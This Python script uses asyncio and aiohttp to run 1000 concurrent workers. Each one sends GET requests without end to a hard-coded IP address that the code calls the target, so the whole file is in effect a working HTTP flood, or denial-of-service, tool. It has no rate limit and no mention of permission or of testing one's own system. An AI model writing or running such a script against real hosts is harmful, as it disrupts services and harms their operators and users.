import asyncio
import aiohttp
from aiohttp import ClientSession

# URL to target - make sure it's formatted correctly (use http:// or https://)
url = 'https://64.234.215.20'

# Max concurrent requests - set high but within reasonable system/network capability
MAX_CONCURRENT_REQUESTS = 1000  # Adjust based on system's hardware/network bandwidth

async def send_request(session: ClientSession):
    """Continuously send requests to the target URL."""
    while True:
        try:
            async with session.get(url) as response:
                # We don't print status codes to avoid flooding the console, just to minimize console overhead
                if response.status == 200:
                    print(f"Request sent successfully to {url}")
                else:
                    print(f"Request failed with status: {response.status}")
        except aiohttp.ClientError as e:
            # Handle potential network issues without stopping the process
            print(f"Network error: {e}")

async def create_request_pool():
    """Create a pool of tasks sending requests concurrently."""
    connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT_REQUESTS)  # Limit per host to maximize concurrency
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session) for _ in range(MAX_CONCURRENT_REQUESTS)]
        await asyncio.gather(*tasks)

# Run the event loop for the async process
if __name__ == "__main__":
    try:
        asyncio.run(create_request_pool())
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")

